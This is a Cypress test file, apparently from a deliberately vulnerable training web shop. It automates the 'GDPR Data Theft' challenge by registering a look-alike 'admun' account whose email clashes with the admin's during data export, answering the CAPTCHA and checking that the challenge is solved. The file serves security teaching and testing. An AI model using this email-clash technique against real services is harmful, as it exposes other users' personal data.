describe('/#/privacy-security/data-export', () => {
  describe('challenge "dataExportChallenge"', () => {
    beforeEach(() => {
      cy.visit('/#/register')

      cy.task<string>('GetFromConfig', 'application.domain').then(
        (appDomain: string) => {
          cy.get('#emailControl').type(`admun@${appDomain}`)
        }
      )
      cy.get('#passwordControl').focus().type('admun123')
      cy.get('#repeatPasswordControl').focus().type('admun123')

      cy.get('mat-select[name="securityQuestion"]').focus().click({ force: true })
      cy.get('.mat-mdc-option')
        .contains('Your eldest siblings middle name?')
        .click()

      cy.get('#securityAnswerControl').focus().type('admun')
      cy.get('#registerButton').click()
    })

    it('should be possible to steal admin user data by causing email clash during export', () => {
      cy.login({ email: 'admun', password: 'admun123' })

      cy.intercept('GET', '/rest/image-captcha/').as('imageCaptcha')
      cy.visit('/#/privacy-security/data-export')
      cy.wait('@imageCaptcha')
      cy.get('#formatControl').contains('JSON').click()
      cy.task<string>('GetFromConfig', 'application.domain').then((appDomain: string) => {
        cy.task<string>('GetImageCaptchaAnswer', `admun@${appDomain}`).then((answer: string) => {
          cy.get('input[aria-label="Input for the CAPTCHA"]').type(answer)
        })
      })
      cy.get('#submitButton').click()
      cy.expectChallengeSolved({ challenge: 'GDPR Data Theft' })
    })
  })
})
